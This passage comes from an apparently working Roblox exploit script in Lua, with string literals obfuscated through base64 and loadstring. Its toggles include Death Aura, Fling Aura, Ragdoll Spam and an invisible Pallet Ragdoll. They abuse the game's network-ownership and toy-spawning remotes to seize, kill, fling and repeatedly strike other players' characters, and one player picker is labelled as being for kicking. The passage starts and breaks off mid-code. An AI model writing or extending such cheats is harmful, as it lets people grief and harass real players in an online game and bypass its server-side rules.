                    local vu432 = v429.Character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                    if vu430 and vu431 and vu432 and vu432.Health > 0 and LocalPlayer.Character and LocalPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                        if (vu430.Position - LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 25 then
                            pcall(function()
                                vu6.SetNetworkOwner:FireServer(vu430, vu430.CFrame)
                                task.wait(0.1)
                                vu6.DestroyGrabLine:FireServer(vu430)
                                if vu431:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) and vu431.PartOwner.Value == LocalPlayer.Name then
                                    for _, v436 in pairs(vu432.Parent:GetChildren()) do
                                        if v436:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                            v436.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                        end
                                    end
                                    task.wait()
                                    for _, v440 in pairs(vu432.Parent:GetChildren()) do
                                        if v440:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                                            v440.CFrame = CFrame.new(-1000000000, 1000000000, -1000000000)
                                        end
                                    end
                                    local vu441 = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))())
                                    vu441.Velocity = Vector3.new(0, -9999999, 0)
                                    vu441.MaxForce = Vector3.new(9000000000, 9000000000, 9000000000)
                                    vu441.P = 100000075
                                    vu441.Parent = vu430
                                    vu432.Sit = false
                                    vu432.Jump = true
                                    vu432.BreakJointsOnDeath = false
                                    vu432:ChangeState(Enum.HumanoidStateType.Dead)
                                    task.delay(2, function()
                                        if vu441 and vu441.Parent then
                                            vu441:Destroy()
                                        end
                                    end)
                                end
                            end)
                        end
                    end
                end
            end
        end)
    else
        vu29.Death_Aura = false
    end
end

TelekinesisGroup:CreateToggle({
    Name = loadstring(base64decode("RGVhdGggQXVyYQ=="))(),
        Flag = loadstring(base64decode("RGVhdGggQXVyYQ=="))(),
    Default = false,
    Callback = death
})
-- [Kick Aura OP PREMIUM removed]
do
    -- // Services & Variables \\ --
    local playersService = game:GetService(loadstring(base64decode("UGxheWVycw=="))())
    local workspaceService = game:GetService(loadstring(base64decode("V29ya3NwYWNl"))())
    local debrisService = game:GetService(loadstring(base64decode("RGVicmlz"))())
    local localPlayer = playersService.LocalPlayer

    -- Remote Events required for network ownership
    local setNetworkOwnerEvent = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))()):WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())

    -- Global Variables used by the Fling Aura UI
    _G.FlingAura = false
    _G.FlingStrength = 400
    _G.FlingTarget = 1 -- 1 = Players, 2 = Objects, 3 = Players and Objects

    -- // Helper Functions \\ --
    
    -- Calculates the CFrame needed to point the fling velocity at the target
    local function lookAt(startPosition, targetPosition)
        local directionVector = (targetPosition - startPosition).Unit
        local rightVector = directionVector:Cross((Vector3.new(0, 1, 0)))
        local upVector = rightVector:Cross(directionVector)
        return CFrame.fromMatrix(startPosition, rightVector, upVector)
    end

    local function GetPlayerCharacter()
        if localPlayer.Character and (localPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) and localPlayer.Character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())) then
            return localPlayer.Character
        end
    end

    local function GetPlayerRoot()
        local playerHumanoidRootPart = GetPlayerCharacter()
        if playerHumanoidRootPart then
            return playerHumanoidRootPart.HumanoidRootPart
        end
    end

    -- Network Ownership Checks
    local function CheckNetworkOwnerShipOnPart(potentialPart, condition)
        if typeof(potentialPart) == loadstring(base64decode("SW5zdGFuY2U="))() and (potentialPart:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) and potentialPart.PartOwner.Value == localPlayer.Name) then
            return not condition and true or potentialPart.PartOwner
        end
    end

    local function CheckNetworkOwnerShipOnPlayer(potentialPlayer, condition)
        if typeof(potentialPlayer) == loadstring(base64decode("SW5zdGFuY2U="))() and (potentialPlayer:IsA(loadstring(base64decode("UGxheWVy"))()) and potentialPlayer.Character) and (potentialPlayer.Character:FindFirstChild(loadstring(base64decode("SGVhZA=="))()) and (potentialPlayer.Character.Head:FindFirstChild(loadstring(base64decode("UGFydE93bmVy"))()) and potentialPlayer.Character.Head.PartOwner.Value == localPlayer.Name)) then
            return not condition and true or potentialPlayer.Character.Head.PartOwner
        end
    end

    local function SNOWshipPlayer(otherPlayer, callbackFunction)
        if localPlayer.Character and (localPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) and (typeof(otherPlayer) == loadstring(base64decode("SW5zdGFuY2U="))() and (otherPlayer:IsA(loadstring(base64decode("UGxheWVy"))()) and otherPlayer.Character)) and otherPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())) then
            local otherPlayerHumanoidRootPart = otherPlayer.Character.HumanoidRootPart
            local distanceFromOtherPlayer = localPlayer:DistanceFromCharacter(otherPlayerHumanoidRootPart.Position)
            if CheckNetworkOwnerShipOnPlayer(otherPlayer) then
                if type(callbackFunction) == loadstring(base64decode("ZnVuY3Rpb24="))() then
                    callbackFunction()
                end
                return true
            end
            if distanceFromOtherPlayer <= 30 then
                setNetworkOwnerEvent:FireServer(otherPlayerHumanoidRootPart, lookAt(localPlayer.Character.HumanoidRootPart.Position, otherPlayerHumanoidRootPart.Position))
            end
        end
    end

    local function SNOWshipTrack(targetPart)
        if targetPart.Parent and targetPart.Parent:IsA(loadstring(base64decode("TW9kZWw="))()) then
            local targetModel = targetPart.Parent
            local isOwnershipTrackConnected = targetModel:GetAttribute(loadstring(base64decode("T3duZXJzaGlwVHJhY2tDb25uZWN0ZWQ="))())
            local isCreatedConnected2 = targetModel:GetAttribute(loadstring(base64decode("Q3JlYXRlZENvbm5lY3RlZDI="))())
            if localPlayer.Character and localPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                local distanceFromCharacter = localPlayer:DistanceFromCharacter(targetPart.Position)
                if isCreatedConnected2 then
                    if isOwnershipTrackConnected then
                        return true
                    end
                    if distanceFromCharacter <= 30 then
                        setNetworkOwnerEvent:FireServer(targetPart, lookAt(localPlayer.Character.HumanoidRootPart.Position, targetPart.Position))
                    end
                else
                    targetModel:SetAttribute(loadstring(base64decode("Q3JlYXRlZENvbm5lY3RlZDI="))(), true)
                    targetModel.DescendantAdded:Connect(function(attribute)
                        if attribute.Name ~= loadstring(base64decode("UGFydE93bmVy"))() or attribute.Value ~= localPlayer.Name then
                            if attribute.Name == loadstring(base64decode("UGFydE93bmVy"))() and attribute.Value ~= localPlayer.Name then
                                targetModel:SetAttribute(loadstring(base64decode("T3duZXJzaGlwVHJhY2tDb25uZWN0ZWQ="))(), false)
                            end
                        else
                            targetModel:SetAttribute(loadstring(base64decode("T3duZXJzaGlwVHJhY2tDb25uZWN0ZWQ="))(), true)
                        end
                    end)
                end
            end
        end
    end

    -- Target Validation Checks
    local function CheckPlayer(potentialPlayer)
        if typeof(potentialPlayer) == loadstring(base64decode("SW5zdGFuY2U="))() and (potentialPlayer ~= localPlayer and potentialPlayer.Character) and (potentialPlayer.Character:IsDescendantOf(workspaceService) and (potentialPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) and (potentialPlayer.Character:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))()) and potentialPlayer.Character.Humanoid.Health > 0))) then
            return true
        end
    end

    local function CheckPlayerAuras(potentialKickedPlayer1)
        if CheckPlayer(potentialKickedPlayer1) and not potentialKickedPlayer1.Character:GetAttribute(loadstring(base64decode("S2lja2luZw=="))()) then
            return true
        end
    end

    -- Spatial parameters for finding loose objects
    local COAroundPParams = OverlapParams.new()
    COAroundPParams.FilterType = Enum.RaycastFilterType.Exclude

    local function CheckObjectsAroundPlayer()
        -- Ensure this list dynamically updates locally within the function
        COAroundPParams.FilterDescendantsInstances = {
            GetPlayerCharacter(),
            workspaceService.Map,
            workspaceService.Plots,
            workspaceService.Waypoints,
            workspaceService.Slots
        }
        
        local playerRoot = GetPlayerRoot()
        if playerRoot then
            local connectedPartsList = {}
            local teslaCoil = nil
            local function isPartConnectable(part)
                if not part:IsDescendantOf(workspaceService.Map) and (not part:IsDescendantOf(workspaceService.Plots) and (not part:IsDescendantOf(workspaceService.Waypoints) and (not part:IsDescendantOf(workspaceService.Slots) and part.Parent))) and (part.Parent:IsA(loadstring(base64decode("TW9kZWw="))()) and (part.Parent:FindFirstChildOfClass(loadstring(base64decode("QmFzZVBhcnQ="))()) or (part.Parent:FindFirstChildOfClass(loadstring(base64decode("UGFydA=="))()) or part.Parent:FindFirstChildOfClass(loadstring(base64decode("TWVzaFBhcnQ="))())))) then
                    local partParent = part.Parent
                    local isConnected2 = partParent:GetAttribute(loadstring(base64decode("Q29ubmVjdGVkMg=="))())
                    
                    local playerFromCharacter
                    if partParent:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))()) then
                        playerFromCharacter = playersService:GetPlayerFromCharacter(partParent)
                    else
                        playerFromCharacter = nil
                    end
                    if not (playerFromCharacter or isConnected2) then
                        return true
                    end
                end
            end
            local partsInRadius = workspaceService:GetPartBoundsInRadius(playerRoot.Position, 28, COAroundPParams)
            local iterator, partIndex, index = pairs(partsInRadius)
            while true do
                local instance
                index, instance = iterator(partIndex, index)
                if index == nil then
                    break
                end
                if isPartConnectable(instance) then
                    local instanceParent = instance.Parent
                    if not table.find(connectedPartsList, instanceParent) then
                        table.insert(connectedPartsList, instanceParent)
                    end
                end
            end
            return connectedPartsList, teslaCoil
        end
    end

    -- // TelekinesisGroup UI Mapping \\ --

    TelekinesisGroup:CreateToggle({
        Name = loadstring(base64decode("RmxpbmcgQXVyYQ=="))(),
        Flag = loadstring(base64decode("ZmxpbmdhdXJhX3RvZ2dsZQ=="))(),
        Default = false,
        Callback = function(flingAuraEnabled)
            -- Apply typical UI State mapping
            if SetToggleState then SetToggleState(loadstring(base64decode("ZmxpbmdhdXJhX3RvZ2dsZQ=="))(), flingAuraEnabled) end
            
            _G.FlingAura = flingAuraEnabled
            if flingAuraEnabled then
                -- Wrap in task.spawn to prevent yielding the main UI thread
                task.spawn(function()
                    while _G.FlingAura do
                        -- FLING OBJECTS
                        if _G.FlingTarget == 2 or _G.FlingTarget == 3 then
                            local objectsAroundPlayer, flingTargetPart = CheckObjectsAroundPlayer()
                            if objectsAroundPlayer then
                                local pairsIterator, pairsState, pairsIndex = pairs(objectsAroundPlayer)
                                while true do
                                    local childObject
                                    pairsIndex, childObject = pairsIterator(pairsState, pairsIndex)
                                    if pairsIndex == nil then
                                        break
                                    end
                                    local retryCount1 = 0
                                    if childObject then
                                        local headPart = childObject:FindFirstChild(loadstring(base64decode("SGVhZA=="))())
                                        local childPairsIterator, iteratorValue7, childPairsIndex = pairs(childObject:GetChildren())
                                        while true do
                                            local childPart
                                            childPairsIndex, childPart = childPairsIterator(iteratorValue7, childPairsIndex)
                                            if childPairsIndex == nil then
                                                break
                                            end
                                            if childPart:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) and childPart.CanQuery then
                                                local networkOwnership = SNOWshipTrack(childPart)
                                                local playerRootPart = GetPlayerRoot()
                                                if not networkOwnership and headPart then
                                                    networkOwnership = CheckNetworkOwnerShipOnPart(headPart)
                                                end
                                                if networkOwnership and playerRootPart then
                                                    if flingTargetPart then
                                                        local currentPosition = flingTargetPart.Position
                                                        flingTargetPart.Position = childPart.Position
                                                        task.wait()
                                                        flingTargetPart.Position = currentPosition
                                                    elseif not childPart:FindFirstChild(loadstring(base64decode("RmxpbmdBdXJhVmVsb2NpdHk="))()) then
                                                        local lookAtCFrame = lookAt(playerRootPart.Position, childPart.Position)
                                                        local flingBodyVelocity = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))(), childPart)
                                                        flingBodyVelocity.Name = loadstring(base64decode("RmxpbmdBdXJhVmVsb2NpdHk="))()
                                                        flingBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                                        flingBodyVelocity.Velocity = Vector3.new(lookAtCFrame.lookVector.X, 0.5, lookAtCFrame.lookVector.Z) * math.clamp(_G.FlingStrength, 400, 600)
                                                        debrisService:AddItem(flingBodyVelocity)
                                                    end
                                                    retryCount1 = retryCount1 + 1
                                                end
                                                if retryCount1 >= 3 then
                                                    break
                                                end
                                            end
                                        end
                                    end
                                end
                            end
                        end

                        -- FLING PLAYERS
                        if _G.FlingTarget == 1 or _G.FlingTarget == 3 then
                            local playerPairsIterator, iteratorValue8, playerPairsIndex = pairs(playersService:GetPlayers())
                            while true do
                                local otherPlayer
                                playerPairsIndex, otherPlayer = playerPairsIterator(iteratorValue8, playerPairsIndex)
                                if playerPairsIndex == nil then
                                    break
                                end
                                if CheckPlayerAuras(otherPlayer) then
                                    local otherPlayerRootPart = otherPlayer.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                                    local snowshipPlayer = SNOWshipPlayer(otherPlayer)
                                    local localPlayerCharacter = GetPlayerCharacter()
                                    if otherPlayerRootPart and (snowshipPlayer and (localPlayerCharacter and not otherPlayerRootPart:FindFirstChild(loadstring(base64decode("RmxpbmdBdXJhVmVsb2NpdHk="))()))) then
                                        local flingDirectionCFrame = lookAt(localPlayerCharacter.HumanoidRootPart.Position, otherPlayerRootPart.Position)
                                        local flingBodyVelocity = Instance.new(loadstring(base64decode("Qm9keVZlbG9jaXR5"))(), otherPlayerRootPart)
                                        flingBodyVelocity.Name = loadstring(base64decode("RmxpbmdBdXJhVmVsb2NpdHk="))()
                                        flingBodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                                        flingBodyVelocity.Velocity = Vector3.new(flingDirectionCFrame.lookVector.X, 0.5, flingDirectionCFrame.lookVector.Z) * _G.FlingStrength
                                        debrisService:AddItem(flingBodyVelocity)
                                    end
                                end
                            end
                        end
                        task.wait(0.1)
                    end
                end)
            end
        end
    })

    TelekinesisGroup:CreateSlider({
        Name = loadstring(base64decode("U3RyZW5ndGg="))(),
        Flag = loadstring(base64decode("ZmxpbmdzdHJlbmd0aHZhbHVlX3RvZ2dsZQ=="))(),
        Min = 400,
        Max = 10000,
        Default = 400,
        Rounding = 0,
        Callback = function(flingStrength)
            _G.FlingStrength = flingStrength
        end
    })

    TelekinesisGroup:CreateDropdown({
        Name = loadstring(base64decode("VGFyZ2V0"))(),
        Flag = loadstring(base64decode("Zmxpbmd0YXJnZXRfZHJvcGRvd24="))(),
        Items = {
            loadstring(base64decode("UGxheWVycw=="))(),
            loadstring(base64decode("T2JqZWN0cw=="))(),
            loadstring(base64decode("UGxheWVycyBhbmQgT2JqZWN0cw=="))()
        },
        Default = loadstring(base64decode("UGxheWVycw=="))(),
        Callback = function(flingTargetType)
            if flingTargetType == loadstring(base64decode("UGxheWVycw=="))() then
                _G.FlingTarget = 1
            elseif flingTargetType == loadstring(base64decode("T2JqZWN0cw=="))() then
                _G.FlingTarget = 2
            elseif flingTargetType == loadstring(base64decode("UGxheWVycyBhbmQgT2JqZWN0cw=="))() then
                _G.FlingTarget = 3
            end
        end
    })
end
-- 1. Target Interaction Dropdown
local PlayerDropdown = TargetGroup:CreateDropdown({
    Name = loadstring(base64decode("U2VsZWN0IHBsYXllciBmb3Iga2ljaw=="))(),
    List = getPlayerList(),
    Default = nil,
    Callback = function(Value)
        selectedKickPlayer = getPlayerFromSelection(Value)
    end,
})

-- // Automatic Refresh Logic \\ --

local function updateDropdown()
    local newList = getPlayerList()
    
    if PlayerDropdown then
        -- We use 'false' here so your current selection doesn't reset 
        -- every time a random person joins the server.
        PlayerDropdown:Refresh(newList, false)
    end
    
    -- Safety: If the target left the game, clear the variable
    if selectedKickPlayer and not selectedKickPlayer.Parent then
        selectedKickPlayer = nil
    end
end

-- // Event Connections \\ --

-- These listen for server changes to trigger the UI update
PS.PlayerAdded:Connect(updateDropdown)
PS.PlayerRemoving:Connect(updateDropdown)

-- Initial run to populate the list correctly on startup
updateDropdown()
-- These listeners make the list update automatically
local addedConn = PS.PlayerAdded:Connect(updateDropdown)
local removedConn = PS.PlayerRemoving:Connect(updateDropdown)

-- Ensure the script cleans up if the UI is destroyed/reloaded
Player.CharacterRemoving:Connect(function()
    addedConn:Disconnect()
    removedConn:Disconnect()
end)
TargetGroup:CreateInput({
    Name = loadstring(base64decode("RmluZCBCeSBOaWNrIFtQQVJUSUFMXQ=="))(),
    Default = loadstring(base64decode(""))(),
    TextDisappear = true,
    Callback = function(Value)
        if Value == loadstring(base64decode(""))() then return end

        Value = Value:lower()

        for _, plr in ipairs(PS:GetPlayers()) do
            local nameMatch = plr.Name:lower():sub(1, #Value) == Value
            local displayMatch = plr.DisplayName:lower():sub(1, #Value) == Value

            if nameMatch or displayMatch then
                -- Сразу выбираем игрока и сохраняем имя
                selectedKickPlayer = plr
                selectedKickPlayerName = plr.Name

                -- Строка должна совпадать с той, которую использует getPlayerList()
                local displayString = string.format(
                    '<font color=loadstring(base64decode("cmdiKDI1NSwwLDAp"))()><b>%s</b></font> <b><xVec0uwV>(%s)</xVec0uwV></b>',
                    plr.Name,
                    plr.DisplayName
                )

                -- This triggers the dropdown to select them, and updates the list state naturally
                PlayerDropdown:Set(displayString)
                break
            end
        end
    end
})

local customKickHeight = 25
local kickLoopEnabled = false

-- 1. THE INPUT BOX (Where you type the height)
TargetGroup:CreateInput({
    Name = loadstring(base64decode("Q3VzdG9tIEtpY2sgSGVpZ2h0"))(),
        Flag = loadstring(base64decode("Q3VzdG9tIEtpY2sgSGVpZ2h0"))(),
    Default = loadstring(base64decode("MjU="))(),
    Placeholder = loadstring(base64decode("RW50ZXIgaGVpZ2h0IChlLmcuIDUwKQ=="))(),
    Numeric = true, -- Only allows numbers
    Finished = true, -- Updates when you press Enter
    Callback = function(Value)
        local num = tonumber(Value)
        if num then
            customKickHeight = num
        else
            customKickHeight = 25 -- Fallback if input is empty or invalid
        end
    end
})

do
    local SpamSetOwner = {
        AutoRagdoll = false,
        Segments = 8,
        ImpactPower = 10
    }

    TargetGroup:CreateToggle({
        Name = loadstring(base64decode("UmFnZG9sbCBTcGFtIChCZXR0ZXIp"))(),
        Flag = loadstring(base64decode("UmFnZG9sbFNwYW1IYW1tZXI="))(),
        Default = false,
        Callback = function(Value)
            SetToggleState(loadstring(base64decode("UmFnZG9sbFNwYW1IYW1tZXI="))(), Value)
            SpamSetOwner.AutoRagdoll = Value
            
            local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
            local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
            local Player = game:GetService(loadstring(base64decode("UGxheWVycw=="))()).LocalPlayer
            
            if Value then
                if not selectedKickPlayer then
                    Library:Notify({ Title = loadstring(base64decode("RXJyb3I="))(), Content = loadstring(base64decode("U2VsZWN0IGEgdGFyZ2V0IHBsYXllciBmaXJzdCE="))(), Duration = 3 })
                    SpamSetOwner.AutoRagdoll = false
                    return
                end

                task.spawn(function()
                    -- 1. Fetch necessary remotes
                    local MenuToys = RS:WaitForChild(loadstring(base64decode("TWVudVRveXM="))())
                    local GrabEvents = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))())
                    
                    local rSpawn = MenuToys:WaitForChild(loadstring(base64decode("U3Bhd25Ub3lSZW1vdGVGdW5jdGlvbg=="))())
                    local rDestroy = MenuToys:WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
                    local rOwner = GrabEvents:WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())

                    -- 2. Spawn the Pallet
                    if rSpawn and Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                        task.spawn(function() 
                            rSpawn:InvokeServer(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))(), Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 5, 0), Vector3.zero) 
                        end)
                    end
                    
                    -- 3. Wait for Pallet to load locally
                    local toyFolder = workspace:WaitForChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))(), 5)
                    if not toyFolder then return end
                    
                    local palletModel = toyFolder:WaitForChild(loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))(), 5)
                    if not palletModel then return end
                    
                    local palletPart = palletModel:WaitForChild(loadstring(base64decode("U291bmRQYXJ0"))(), 5)
                    if not palletPart then return end
                    
                    -- Claim initial ownership
                    if rOwner then 
                        rOwner:FireServer(palletPart, palletPart.CFrame) 
                    end
                    
                    local hammerGoingDown = true
                    local segmentIndex = 0
                    local lastOwnerTime = tick()
                    
                    -- 4. Main Hammer Loop
                    while SpamSetOwner.AutoRagdoll and palletModel.Parent do
                        RunService.Heartbeat:Wait()
                        
                        local targetChar = selectedKickPlayer and selectedKickPlayer.Character
                        local targetHrp = targetChar and targetChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        
                        if targetHrp and rOwner then
                            -- Re-claim network ownership periodically to fight desync
                            if tick() - lastOwnerTime > 1.0 then 
                                rOwner:FireServer(palletPart, palletPart.CFrame) 
                                lastOwnerTime = tick() 
                            end
                            
                            local startPos = targetHrp.Position + Vector3.new(0, 50000, 0)
                            local endPos = targetHrp.Position
                            
                            if hammerGoingDown then
                                segmentIndex = segmentIndex + 1
                                local alpha = segmentIndex / SpamSetOwner.Segments
                                local nextPos = startPos:Lerp(endPos, alpha)
                                
                                palletPart.CFrame = CFrame.new(nextPos)
                                palletPart.AssemblyLinearVelocity = Vector3.new(0, -50000, 0)
                                palletPart.AssemblyAngularVelocity = Vector3.zero
                                
                                if segmentIndex >= SpamSetOwner.Segments then
                                    palletPart.AssemblyLinearVelocity = Vector3.new(0, -SpamSetOwner.ImpactPower, 0)
                                    hammerGoingDown = false
                                end
                            else
                                palletPart.CFrame = CFrame.new(startPos)
                                palletPart.AssemblyLinearVelocity = Vector3.zero
                                segmentIndex = 0
                                hammerGoingDown = true
                            end
                        else
                            -- If target dies or is missing, idle the pallet above your own head
                            if Player.Character and Player.Character:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))()) then
                                palletPart.CFrame = Player.Character.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0)
                                palletPart.AssemblyLinearVelocity = Vector3.zero
                            end
                        end
                    end
                    
                    -- 5. Cleanup when toggled off
                    if rDestroy and palletModel then 
                        rDestroy:FireServer(palletModel) 
                    end
                end)
            end
        end
    })
end

TargetGroup:CreateToggle({
    Name = loadstring(base64decode("UGFsbGV0IFJhZ2RvbGwgKEludmlzKQ=="))(),
    Flag = loadstring(base64decode("UmFnZG9sbCBUYXJnZXQ="))(),
    Default = false,
    Callback = function(Value)
        SetToggleState(loadstring(base64decode("UmFnZG9sbCBUYXJnZXQ="))(), Value)
        local RS = game:GetService(loadstring(base64decode("UmVwbGljYXRlZFN0b3JhZ2U="))())
        local RunService = game:GetService(loadstring(base64decode("UnVuU2VydmljZQ=="))())
        local DestroyToy = RS:WaitForChild(loadstring(base64decode("TWVudVRveXM="))()):WaitForChild(loadstring(base64decode("RGVzdHJveVRveQ=="))())
        local SetNetOwner = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("U2V0TmV0d29ya093bmVy"))())
        local DestroyLine = RS:WaitForChild(loadstring(base64decode("R3JhYkV2ZW50cw=="))()):WaitForChild(loadstring(base64decode("RGVzdHJveUdyYWJMaW5l"))())
        local toysFolder = workspace:WaitForChild(LocalPlayer.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
        local lpName = LocalPlayer.Name

        -- Clean up existing frame connections
        local function clearAttackLoop()
            if getgenv().ragdollSteppedConn then
                getgenv().ragdollSteppedConn:Disconnect()
                getgenv().ragdollSteppedConn = nil
            end
        end

        if Value then
            if not selectedKickPlayer then
                Library:Notify(loadstring(base64decode("U2VsZWN0IHRhcmdldCBmaXJzdA=="))(), 3)
                return
            end

            getgenv().palletRagdollActive = true
            getgenv().PalletForRagdoll = nil
            
            if getgenv().palletCacheConn then
                getgenv().palletCacheConn:Disconnect()
            end
            clearAttackLoop()

            -- 1. Cache and Setup Pallet
            getgenv().palletCacheConn = toysFolder.ChildAdded:Connect(function(child)
                if not getgenv().palletRagdollActive then return end
                if child.Name ~= loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))() and child.Name ~= loadstring(base64decode("UGFsbGV0Rm9yUmFnZG9sbA=="))() then return end

                local soundPart = child:WaitForChild(loadstring(base64decode("U291bmRQYXJ0"))(), 3)
                if not soundPart then return end

                -- Claim network ownership instantly
                pcall(function()
                    SetNetOwner:FireServer(soundPart, soundPart.CFrame)
                    DestroyLine:FireServer(soundPart)
                end)

                local partOwner = soundPart:WaitForChild(loadstring(base64decode("UGFydE93bmVy"))(), 1)
                if partOwner and partOwner.Value == lpName then
                    -- Make fully invisible and non-collidable for local player
                    for _, v in pairs(child:GetChildren()) do
                        if v:IsA(loadstring(base64decode("QmFzZVBhcnQ="))()) then
                            v.CanCollide = false
                            v.CanQuery = false
                            v.Transparency = 1 
                        end
                    end

                    child.Name = loadstring(base64decode("UGFsbGV0Rm9yUmFnZG9sbA=="))()
                    getgenv().PalletForRagdoll = child

                    -- Toggle flag for the alternating strike directions
                    local strikePhase = false

                    -- 2. Engine-Synced Attack Loop (Stepped runs right before physics simulation)
                    getgenv().ragdollSteppedConn = RunService.Stepped:Connect(function()
                        if not getgenv().palletRagdollActive or not child.Parent then 
                            clearAttackLoop()
                            return 
                        end

                        local tChar = selectedKickPlayer and selectedKickPlayer.Character
                        local tRoot = tChar and tChar:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        local tHum = tChar and tChar:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())

                        if tRoot and tHum and soundPart.Parent and tHum.Health > 0 then
                            local ragdolledVal = tHum:FindFirstChild(loadstring(base64decode("UmFnZG9sbGVk"))())
                            local isRagdolled = ragdolledVal and ragdolledVal.Value or false

                            if not isRagdolled then
                                -- Alternating hyper-velocity strikes every single frame
                                strikePhase = not strikePhase
                                if strikePhase then
                                    soundPart.CFrame = tRoot.CFrame * CFrame.new(0, 2, 0)
                                    soundPart.AssemblyLinearVelocity = Vector3.new(0, -9e5, 0)
                                else
                                    soundPart.CFrame = tRoot.CFrame * CFrame.new(0, -1, 0)
                                    soundPart.AssemblyLinearVelocity = Vector3.new(0, 9e5, 0)
                                end
                            else
                                -- Instantly pull away to reduce lag once ragdolled
                                soundPart.CFrame = CFrame.new(0, 9e9, 0)
                                soundPart.AssemblyLinearVelocity = Vector3.zero
                            end
                        else
                            soundPart.CFrame = CFrame.new(0, 9e9, 0)
                            soundPart.AssemblyLinearVelocity = Vector3.zero
                        end
                    end)

                    -- Handle respawn/destruction
                    child.AncestryChanged:Connect(function()
                        if not child.Parent then
                            clearAttackLoop()
                            getgenv().PalletForRagdoll = nil
                            if getgenv().palletRagdollActive then
                                task.wait(0.03)
                                if getgenv().spawnNewPallet then getgenv().spawnNewPallet() end
                            end
                        end
                    end)
                else
                    pcall(function() DestroyToy:FireServer(child) end)
                end
            end)

            -- 3. Toy Spawner Function
            getgenv().spawnNewPallet = function()
                if not getgenv().palletRagdollActive then return end
                if getgenv().PalletForRagdoll and getgenv().PalletForRagdoll.Parent then return end
                
                local c = LocalPlayer.Character
                local h = c and c:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                if not h then return end

                task.spawn(function()
                    pcall(function()
                        RS.MenuToys.SpawnToyRemoteFunction:InvokeServer(
                            loadstring(base64decode("UGFsbGV0TGlnaHRCcm93bg=="))(),
                            h.CFrame * CFrame.new(0, 10, 20),
                            Vector3.zero
                        )
                    end)
                end)
            end

            getgenv().spawnNewPallet()
        else
            -- Clean up everything completely
            getgenv().palletRagdollActive = false
            clearAttackLoop()

            if getgenv().palletCacheConn then
                getgenv().palletCacheConn:Disconnect()
                getgenv().palletCacheConn = nil
            end

            local pallet = getgenv().PalletForRagdoll
            if pallet and pallet.Parent then
                pcall(function() DestroyToy:FireServer(pallet) end)
            end

            getgenv().PalletForRagdoll = nil

            if toysFolder:FindFirstChild(loadstring(base64decode("UGFsbGV0Rm9yUmFnZG9sbA=="))()) then
                pcall(function() DestroyToy:FireServer(toysFolder.PalletForRagdoll) end)
            end
        end
    end,
})

do
    BlobGroup:CreateToggle({
        Name = loadstring(base64decode("QXV0byBTaXQgQmxvYm1hbg=="))(),
        Flag = loadstring(base64decode("QXV0byBTaXQgQmxvYm1hbg=="))(),
        Default = false,
        Callback = function(Value)
        SetToggleState(loadstring(base64decode("QXV0byBTaXQgQmxvYm1hbg=="))(), Value)
            if Value then
                task.spawn(function()
                    while GetToggleState(loadstring(base64decode("QXV0byBTaXQgQmxvYm1hbg=="))()) do
                        local Char = Player.Character
                        local Hum = Char and Char:FindFirstChildOfClass(loadstring(base64decode("SHVtYW5vaWQ="))())
                        local Root = Char and Char:FindFirstChild(loadstring(base64decode("SHVtYW5vaWRSb290UGFydA=="))())
                        if Hum and Root and not Hum.SeatPart then
                            local folder = workspace:FindFirstChild(Player.Name .. loadstring(base64decode("U3Bhd25lZEluVG95cw=="))())
                            local blob = folder and folder:FindFirstChild(loadstring(base64decode("Q3JlYXR1cmVCbG9ibWFu"))())

                            -- Pas de blob, on en spawn un
                            if not blob then
                                pcall(function()
